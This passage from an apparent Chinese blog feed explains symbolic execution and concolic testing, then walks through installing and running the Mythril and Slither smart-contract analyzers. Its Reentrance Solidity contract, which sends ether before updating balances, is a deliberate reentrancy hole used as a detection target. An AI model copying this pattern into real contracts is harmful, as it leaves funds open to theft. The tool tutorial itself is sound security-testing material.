将分支条件加入到相应的路径约束中，若约束可解，则说明该路径是可达的。符号执行的目的是在给定的时间内，尽可能的探索更多的路径。根据运行的目的来分，主要有两个：</p><ul><li>从测试的角度来看，它可以模拟出各个路径的输入值，从而创建高覆盖率的测试套件。这里是静态的分析程序得到测试需要的输入，与动态执行程序的测试不同，动态执行程序的测试更多的是依赖完备的测试用例来提升测试的覆盖率，达到发现问题的目的。比如曾经使用过的IBM的Purify 来检测代码的内存泄露问题。就需要人工的看代码，编制大量的测试用例，然后通过让程序执行分别执行这些输入，来提高代码的覆盖率，从而尽可能的发现内存泄漏的问题。</li><li>从缺陷查找的角度来看，它为开发人员提供了触发的缺陷的具体输入，利用该输入，程序可用于缺陷的确认或调试。符号执行不仅限于查找诸如缓冲区溢出之类的问题，而且可以通过根据缺陷发现的条件，生成复杂的断言，来判断缺陷发生的可能性。</li></ul><p>还是用这个经典的例子，来说明符号执行的具体过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int twice(int v)&#123;</span><br><span class="line">     return 2*v;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void testme(int x, int y)&#123;</span><br><span class="line">     z &#x3D; twice(y);</span><br><span class="line">     if (z &#x3D;&#x3D; x)&#123;</span><br><span class="line">         if (x &gt; y+10)</span><br><span class="line">             ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line">   </span><br><span class="line">int main()&#123;</span><br><span class="line">   x &#x3D; sym_input();</span><br><span class="line">   y &#x3D; sym_input();</span><br><span class="line">   testme(x, y);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中的函数testme()有三条执行路径。符号执行的目的，就是在给定的时间预算内，生成一组输入，并通过这些输入尽可能多的探索执行路径。</p><ul><li>执行路径(execution path)：一个true和false的序列seq ={p0, p1, …, pn}。其中，如果是一个条件语句，那么pi=ture则表示条件语句的取值为：true，否则取false；</li><li>执行树(execution tree)：一个程序的所有执行路径则可表征成一棵执行树。<br>下图是样例代码的执行树：</li></ul><p><img src="sybolcode.png" alt=""> </p><p>符号执行维护了<strong>符号状态**</strong>σ（<strong><strong>symbolic state</strong></strong>）和符号路径约束<strong> </strong>PC<strong><strong>（</strong></strong>path constraint (or path condition)<strong>**）</strong>，其中 σ 表示变量到符号表达式的映射，PC 是符号表示的不含量词的一阶表达式。在符号执行的初始化阶段，σ 被初始化为空映射，而 PC 被初始化为 true，并随着符号执行的过程不断变化。在对程序的某一路径分支进行符号执行的终点，把 <strong>PC</strong> <strong>输入约束求解器（**</strong>constraint solver<strong>**）</strong>以获得求解，生成<strong>实际的输入值</strong>。如果程序把生成的具体值作为输入执行，它将会和符号执行运行在同一路径，即此时PC的公式所表示的路径，并且以同一种方式结束。</p><p>对于样例代码，具体的过程如下</p><ul><li><p>初始化：初始化符号状态σ为空，符号路径约束PC为true；</p></li><li><p>在每个赋值v = e处，符号执行都通过将 v 映射到σ(e)来更新σ，该映射是通过对当前符号状态求值, 而获得的符号表达式。 例如：</p></li><li><ul><li>main（）函数的前两行（第14-15行）的符号执行导致σ= {x ↦x0，y ↦ y0}，其中x0，y0是两个初始不受约束的符号值；</li><li>在执行第6行之后，σ = {x ↦x0，y ↦y0，z ↦ 2y0}。</li></ul></li><li><p>对于每个条件语句：if（e） then S1 else S2。</p></li><li><ul><li>在第7行之后，分别创建了两个符号执行实例，分别具有路径约束x0 = 2y0和x ≠ 2y0;</li><li>在第8行之后，分别创建两个具有路径约束的符号执行实例（x0 = 2y0）∧（x0 &gt; y0 + 10）和（x0 = 2y0）∧（x0 ≤ y0 + 10）。</li><li>“then”分支： PC被更新为PC ∧ σ(e)；</li><li>“else”分支： 生成一个新的PC’, PC’被初始化为：PC∧¬ σ(e)；</li><li>如果分支的状态σ的PC可满足，则符号执行沿着分支继续，否则路径终止。<br>例如:</li></ul></li><li><p>如果一个符号执行实例碰到了exit或error时，当前符号执行实例就会被终止，并利用一个现成的约束求解器来生成一个可满足当前路径约束的赋值。 例如：</p></li><li><ul><li>三条路径按照约束求解后，分别得到我们期望的三组输入：{x=0, y=1}，{x=2, y=1}和{x=30, y=15}。</li></ul></li><li><p>若代码中包含循环或递归结构，且它们的终止条件是符号化的，则可能导致有无穷多条路径。在实践过程中，需要对路径搜索设置一个限制，例如timeout，限制路径数量，循环迭代次数或探测深度。</p></li></ul><p>经典的符号执行有一个关键的缺点，若符合执行路径的符号路径约束无法使用约束求解器进行有效的求解，则无法生成输入。</p><h2 id="现代符号执行技术"><a href="#现代符号执行技术" class="headerlink" title="现代符号执行技术"></a>现代符号执行技术</h2><p>经典的符号执行，过度的依赖了符号执行的约束求解能力，这就限制了传统符号执行的能力发挥。很快大家发现在分析过程中，如果能加入具体值进行分析，将大大简化分析过程，降低分析的难度和提升效率；但分析过程中，仍不可避免的还是需要将各种条件表达式，进行符号化抽象后变成约束条件参与执行。将程序语句转换为符号约束的精度，对符号执行所达到的覆盖率以及约束求解的可伸缩性会产生重大影响。所以如何做好混合具体(Concrete)执行和符号(Symbolic)执行的能力的平衡，就成为现代符号执行的关键点。</p><p><img src="symbol_now.png" alt=""></p><p>混合执行测试和执行生成测试这两种现代符号执行的代表都是基于这个思想发展而来的。下面以混合执行测试为例说明下现代符号执行的主要过程。</p><p>与经典的符号执行不同，由于混合执行在整个执行过程中，需要维护程序的具体状态，因此其输入需要初始具体值。 混合执行测试从一个给定的输入或随机输入开始执行程序，沿着执行的条件语句在输入上收集符号约束，然后使用约束求解推断先前输入的变化，以便引导程序接下来的执行该走向哪一个执行路径。重复此过程，直到探索了所有执行路径，或者满足用户定义的覆盖标准、时间设置到期为止。</p><p>混合执行测试会同时维护两个状态：</p><ul><li><p>具体状态：映射所有有具体值的变量；</p></li><li><p>符号状态：仅映射没有具体值的变量。</p></li></ul><p>对于样例代码，执行过程如下：</p><ul><li><p>混合执行会生成一些随机的输入值，比如{x=22, y=7}，然后符号化和具体化地一起来执行程序。</p></li><li><p>依据{x=22, y=7}，程序在第7行，这个具体的执行会走向else分支；符号执行沿着执行路径会生成x ≠ 2y0的路径约束；</p></li><li><p>混合测试将路径约束中的连接（x ≠ 2y0）取反，生成一个新的约束x0=2y0，并求解得到测试输入{x=2, y=1}。这个新的输入会强制让程序执行then路径。</p></li><li><p>依据{x=2, y=1}，程序在第8行执行else分支。混合测试会沿着具体执行来进行符号执行，并生成路径约束（x0 = 2y0）∧（x0 &gt; y0 + 10）；</p></li><li><p>混合测试将路径约束中的连接（（x0 &gt; y0 + 10））取反，会生成一个新约束（x0 = 2y0）∧（x0 ≤ y0 + 10）的测试，求解得到测试输入{x=30, y=15}。在这个输入下程序走到ERROR语句。</p></li><li><p>混合测试报告所有被探索的执行路径，并终止测试输入的生成。</p></li></ul><p>比较混合执行测试和传统的符号执行，不难发现由于具体值的引入，简化了约束求解的难度。</p><h2 id="主要挑战"><a href="#主要挑战" class="headerlink" title="主要挑战"></a>主要挑战</h2><h3 id="路径爆炸-Path-Explosion"><a href="#路径爆炸-Path-Explosion" class="headerlink" title="路径爆炸(Path Explosion)"></a>路径爆炸(Path Explosion)</h3><p>符号执行在过程处理中默认已经过滤了以下两种路径：</p><ul><li><p>不依赖于符号输入的路径；</p></li><li><p>对于当前的路径约束，不可解的路径。 但是，尽管符号执行已经做了这些过滤，路径爆炸依旧是符号执行的最大挑战。路径爆炸不是符号执行特有的挑战，是整个程序分析都需要考虑的最大的问题。</p></li></ul><p>解决路径爆炸的方案，可以从以下两个角度来考虑：</p><ul><li><p>减少路径总数（优先的考虑最有希望的路径， 路径合并，剪枝）；</p></li><li><p>相似的路径不再分析（函数摘要，缓存）；</p></li></ul><p>依据这个思路业界提出了两种解决方案。</p><ul><li>启发式（Heuristic)： 大多数启发式方法侧重于实现较高的语句和分支覆盖率。</li></ul><ol><li><p>特别有效的方法是使用静态控制流图（CFG）来指导探索，向最接近的路径或优先选择先前执行次数最少的语句；</p></li><li><p>在每个可行的符号分支，随机选择要探索的一侧； 或者将符号检验与随机检验进行交错进行；</p></li><li><p>采用先验知识，探索以往容易出错的函数；目前也有研究通过AI的方式得到这些推荐的分析路径；</p></li></ol><ul><li>利用完善的程序分析技术 : 这种方法主要是使用程序分析和软件验证中的各种思想，以合理的方式降低路径探索的复杂性。</li></ul><ol><li><p>静态地合并路径，然后再求解；</p></li><li><p>通过函数摘要，缓存或重用已经计算过的信息用于后续的计算中；</p></li><li><p>通过剪枝，去除无关的变量对路径的求解的影响；</p></li></ol><h3 id="约束求解"><a href="#约束求解" class="headerlink" title="约束求解"></a>约束求解</h3><p>尽管在过去的几年中，约束解决方案技术取得了长足的进步，但约束求解是符号执行的技术瓶颈。</p><ul><li><p>减少不相关的约束(Irrelevant constraint elimination) 符号执行中的绝大多数查询是为了确定某个分支的可行性，一种有效的优化方法是从路径条件中删除与当前分支的结果无关的那些约束。</p></li><li><p>增量求解(incremental solving) 符号执行期间生成的约束集的一个重要特征是，它们根据来自程序源代码的一组固定的静态分支来表示。因此，许多路径具有相似的约束集，因此可以采用相似的解决方案。</p></li></ul><ol><li><p>通过重用先前类似查询的结果，来提高约束求解的速度；</p></li><li><p>通过约束集的超集，减少无解的情况出现； </p></li></ol><h3 id="内存建模"><a href="#内存建模" class="headerlink" title="内存建模"></a>内存建模</h3><p>在符号执行中我们将变量映射到了一个内存模型，来表示这个变量的类型、值或者值域。这个对变量的抽象模式对程序语句转化成符号约束的精度和对符号执行的覆盖率有着很大的影响。太过精确，往往容易陷入复杂的计算，而不能得到具体的解；太过笼统，又会造成漏报。所以精度和可扩展性之间是需要权衡的。</p><p>目前这个权衡的主要参考依据是：</p><ol><li><p>具体分析问题的性质；</p></li><li><p>采用的约束求解器的限制；</p></li></ol><h2 id="Mythril工具"><a href="#Mythril工具" class="headerlink" title="Mythril工具"></a>Mythril工具</h2><p>Mythril是一个基于符号执行技术的以太坊智能合约安全工具， 其预置的检测模块可以发现合约中存在的一些安全问题。</p><p>官方文档<a href="https://mythril-classic.readthedocs.io/" target="_blank" rel="noopener">https://mythril-classic.readthedocs.io/</a></p><p>github仓库<a href="https://github.com/ConsenSys/mythril" target="_blank" rel="noopener">ConsenSys/mythril: Security analysis tool for EVM bytecode. Supports smart contracts built for Ethereum, Hedera, Quorum, Vechain, Roostock, Tron and other EVM-compatible blockchains. (github.com)</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>目前Mythril虽然没有明确说不支持Windows，但我在windows上安装Mythril遇到了困难，转而在Ubuntu上安装。</p><h4 id="Mythril-on-Ubuntu"><a href="#Mythril-on-Ubuntu" class="headerlink" title="Mythril on Ubuntu"></a>Mythril on Ubuntu</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Update</span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"># Install solc</span><br><span class="line">sudo apt install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ethereum&#x2F;ethereum</span><br><span class="line">sudo apt install solc</span><br><span class="line"></span><br><span class="line"># Install libssl-dev, python3-dev, and python3-pip</span><br><span class="line">sudo apt install libssl-dev python3-dev python3-pip</span><br><span class="line"></span><br><span class="line"># Install mythril</span><br><span class="line">pip3 install mythril</span><br><span class="line">myth version</span><br></pre></td></tr></table></figure><h4 id="Mythril-on-Docker"><a href="#Mythril-on-Docker" class="headerlink" title="Mythril on Docker"></a>Mythril on Docker</h4><p>所有 Mythril 版本，从 v0.18.3 开始，都以 Docker 镜像的形式发布到 DockerHub。<code>mythril/myth</code></p><p>安装 <a href="https://docs.docker.com/install/" target="_blank" rel="noopener">Docker CE</a> 后：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Pull the latest release of mythril&#x2F;myth</span><br><span class="line">$ docker pull mythril&#x2F;myth</span><br></pre></td></tr></table></figure></blockquote><p>使用与使用命令相同的方式<code>docker run mythril/myth``myth</code></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run mythril&#x2F;myth --help</span><br><span class="line">docker run mythril&#x2F;myth disassemble -c &quot;0x6060&quot;</span><br></pre></td></tr></table></figure></blockquote><p>要将文件从主机传递到 dockerized Mythril，必须将其包含文件夹正确挂载到容器中。对于在当前工作目录中，执行以下操作：<code>contract.sol</code></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v $(pwd):&#x2F;tmp mythril&#x2F;myth analyze &#x2F;tmp&#x2F;contract.sol</span><br></pre></td></tr></table></figure></blockquote><h3 id="Mythril工作原理"><a href="#Mythril工作原理" class="headerlink" title="Mythril工作原理"></a>Mythril工作原理</h3><p>Mythril通过在一个特制的以太坊虚拟机里运行智能合约字节码来检查 合约的安全问题，它使用<a href="http://blog.hubwiz.com/2020/05/08/mythril-symbolic-execution/" target="_blank" rel="noopener">符号执行</a> 技术来检查程序可能的状态，分析过程包含以下步骤：</p><p>1、获取合约字节码 2、初始化合约账户的状态 3、利用n个交易来探索合约的状态空间，n默认为2，但可以设置为任意值 4、当发现不希望的状态时，证明或否定其在特定假设下的可到达性</p><p>当发现一个漏洞状态时，我们可以计算到达该状态所需的交易。这不仅有助于 确定问题的根源，而且也可以用于漏洞利用。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>Mythril最基本的安全分析命令是<code>myth analyze</code>，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myth analyze &lt;Solidity file&gt;</span><br><span class="line">myth analyze -a &lt;contract address&gt;</span><br></pre></td></tr></table></figure><p>没有其他参数的话，myth analyze命令将执行适合大多数情况的通用分析。</p><p>依旧是准备了一个重入漏洞的合约：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;</span><br><span class="line">    uint256 public score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始状态：0.001ether</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Reentrance</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 amount</span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt;= amount);</span><br><span class="line">        <span class="built_in">require</span>(address(<span class="keyword">this</span>).balance &gt;= amount);</span><br><span class="line">        <span class="comment">// 发送以太</span></span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        <span class="comment">// 状态变量修改</span></span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address adre</span>) <span class="title">constant</span> <span class="title">returns</span>(<span class="params">uint256</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[adre];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">wallet</span>(<span class="params"></span>) <span class="title">constant</span> <span class="title">returns</span>(<span class="params">uint256 result</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isCompleted</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        score = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(isContract(msg.sender))&#123;</span><br><span class="line">            score = <span class="number">25</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(address(<span class="keyword">this</span>).balance == <span class="number">0</span>)&#123;</span><br><span class="line">            score = <span class="number">100</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isContract</span>(<span class="params">address addr</span>) <span class="title">private</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123; <span class="attr">size</span> := extcodesize(addr) &#125;</span><br><span class="line">        <span class="keyword">return</span> size &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行以下语句，即可对合约进行分析。</p><p><code>myth analyze  contracts/overflow.sol</code></p><p>可以看到，分析出了107也就是重入漏洞</p><p><img src="myth_reentrancy.png" alt=""></p><blockquote><p>ps：吐槽一下Mythril，目前没有发现这个工具和hardhat，truffle等主流框架兼容。使用起来有点麻烦。</p></blockquote><p>让我意外的是myth给我这个重入合约还检测出来一个漏洞，SWC104，我去一翻文档，好家伙，居然是没有检查call的返回值。不能说是误报吧，但确实没有必要，这也让我怀疑myth底层是不是检测到call调用就会返回去看你检查返回值没有。</p><p><img src="myth_callreturn.png" alt=""></p><h4 id="更多选项"><a href="#更多选项" class="headerlink" title="更多选项"></a>更多选项</h4><p>你还可以选择 -o json来指定json格式输出，我这里换了一个有溢出漏洞的合约测试：</p><p><img src="overflow.png" alt=""></p><p>可以看到检测出了101溢出。</p><p>还有更多的选项，如下:</p><ul><li>analyze (a)，分析智能合约</li><li>disassemble (d)，拆解合约，返回合约对应的Opcodes</li><li>pro (p)，使用Mythril 专业版（收费）</li><li>list-detectors，列出可用的安全检测模型</li><li>read-storage，通过rpc读取指定地址的存储插槽</li><li>leveldb-search，从本地leveldb中检索</li><li>function-to-hash，计算合约方法的函数标识码</li><li>hash-to-address，将hash转换为以太坊地址</li><li><p>version，版本号</p></li><li><p>o 输出格式，可选text/markdown/json/jsonv2</p></li><li>t 交易个数</li></ul><ul><li>solv 是指定solidity编译版本</li></ul><h4 id="交易数t"><a href="#交易数t" class="headerlink" title="交易数t"></a>交易数t</h4><p>在这里特别说一下-t 也就是交易个数，默认情况下交易数是2。刚刚讲过了符号执行的原理，我们就应该知道，myth是通过探索路径来检测漏洞的，而solidity漏洞许多需要进行复杂的交易，也就是路径会特别深，一般情况下两次交易足够检查出基础的漏洞，特殊的逻辑漏洞还是需要人工进行合约审计的。</p><p>由于每个交易可以具有多个有效的最终状态，在理论上，要探索的状态空间与交易数量成指数关系，交易个数越大，执行时间也越长。Mythril在处理多个交易方面通过分析程序路径在读写状态变量的过程关联关系，可以缩小交易个数。</p>]]></content>
      
      
      <categories>
          
          <category> static-analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static-analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>slither工具</title>
      <link href="/slither/"/>
      <url>/slither/</url>
      
        <content type="html"><![CDATA[<hr><pre><code>author：Thomas_Xu</code></pre><h1 id="slither工具使用记录"><a href="#slither工具使用记录" class="headerlink" title="slither工具使用记录"></a>slither工具使用记录</h1><p>最近对静态分析很感兴趣，先从工具入手，今天先试一试Slither—一款静态智能合约分析工具。</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>slither使用python3编写的智能合约静态分析框架，整体环境比较好，提供如下功能：</p><ul><li>自动化漏洞检测。提供超60多项的漏洞检查模型，模型列表详见：<a href="https://link.zhihu.com/?target=https%3A//github.com/crytic/slither%23detectors">https://github.com/crytic/slither#detectors</a> 。</li><li>自动优化检测。Slither可以检测编译器遗漏的代码优化项并给出优化建议。</li><li>代码理解。Slither能够绘制合约的继承拓扑图，合约方法调用关系图等，帮助开发者理解代码。</li><li>辅助代码审查。用户可以通过API与Slither</li><li>进行交互。</li></ul><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Slither支持pip、源码编译和docker三种安装方式。 <strong>pip安装</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install slither-analyzer</span><br></pre></td></tr></table></figure><p><strong>源码编译</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;crytic&#x2F;slither.git &amp;&amp; cd slither</span><br><span class="line">$ python3 setup.py install</span><br></pre></td></tr></table></figure><p><strong>docker安装</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull trailofbits&#x2F;eth-security-toolbox</span><br></pre></td></tr></table></figure><p>在安装时，会有大量的依赖安装，这里建议使用pip的方式安装，不容易出错</p><h2 id="合约漏洞检测"><a href="#合约漏洞检测" class="headerlink" title="合约漏洞检测"></a>合约漏洞检测</h2><p>我准备了一个重入代码，直接上手试试：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;</span><br><span class="line">    uint256 public score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始状态：0.001ether</span></span><br><span class="line">    <span class="keyword">constructor</span>() public payable &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 amount</span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt;= amount);</span><br><span class="line">        <span class="built_in">require</span>(address(<span class="keyword">this</span>).balance &gt;= amount);</span><br><span class="line">        <span class="comment">// 发送以太</span></span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        <span class="comment">// 状态变量修改</span></span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address adre</span>) <span class="title">constant</span> <span class="title">returns</span>(<span class="params">uint256</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[adre];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">wallet</span>(<span class="params"></span>) <span class="title">constant</span> <span class="title">returns</span>(<span class="params">uint256 result</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isCompleted</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        score = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(isContract(msg.sender))&#123;</span><br><span class="line">            score = <span class="number">25</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(address(<span class="keyword">this</span>).balance == <span class="number">0</span>)&#123;</span><br><span class="line">            score = <span class="number">100</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isContract</span>(<span class="params">address addr</span>) <span class="title">private</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123; <span class="attr">size</span> := extcodesize(addr) &#125;</span><br><span class="line">        <span class="keyword">return</span> size &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行<code>slither contracts/Reentrance.sol</code>  在truffle或hardhat框架下运行，会自动拉去框架下的编译器版本。</p><p>否则建议下载<code>solc-select</code>，以便 Slither 可以自动切换到预期的 solc 版本。</p><p>结果如下：</p><p><img src="slither_1.png" alt=""></p><p>可以看到输出结果是比较详尽的，会告诉你在多少行出现了重入漏洞。</p><p>他也会提醒你有一些编程习惯上的问题，跟着他的提示改可以很好的优化自己的代码，甚至减少gas。</p><p>slither还有很多很多好用的工具，这里列举几个</p><h3 id="human-summary"><a href="#human-summary" class="headerlink" title="human-summary"></a>human-summary</h3><p>我们还可以使用<code>slither contracts/Reentrance.sol --print human-summary</code>命令来提高slither的可读性</p><p><img src="slither_2.png" alt=""></p><p>这样是不是就有点像一个简单版的审计报告了。</p><h3 id="inheritance-graph"><a href="#inheritance-graph" class="headerlink" title="inheritance-graph"></a>inheritance-graph</h3><p>还可以通过slither为我们生成一个继承图，可以帮我们理清合约中的关系（个人认为这个工具不如其他的插件做的好）</p><p><code>slither contracts/Retrency.sol --print inheritance-graph</code></p><p><img src="slither3.png" alt=""></p><p>上图是slither为我们生成的graph，下图是使用: <a href="https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor" target="_blank" rel="noopener">Solidity Visual Developer</a>生成的graph，在代码量很大时非常有用。</p><p><img src="slither4.png" alt=""></p><h3 id="call-graph"><a href="#call-graph" class="headerlink" title="call-graph"></a>call-graph</h3><p>也可以使用<code>slither contracts/Retrency.sol --print call-graph</code>来为我们生成call-graph（会生成两张）</p><p><img src="slither5.png" alt=""></p><h3 id="contract-summary"><a href="#contract-summary" class="headerlink" title="contract-summary"></a>contract-summary</h3><p>合约变量函数一揽，也可以使用function-summary（输出会更详细一点）</p><p><img src="slither6.png" alt=""></p><p>更多的功能可以查看<a href="https://github.com/crytic/slither/wiki/Printer-documentation" target="_blank" rel="noopener">Printer documentation · crytic/slither Wiki 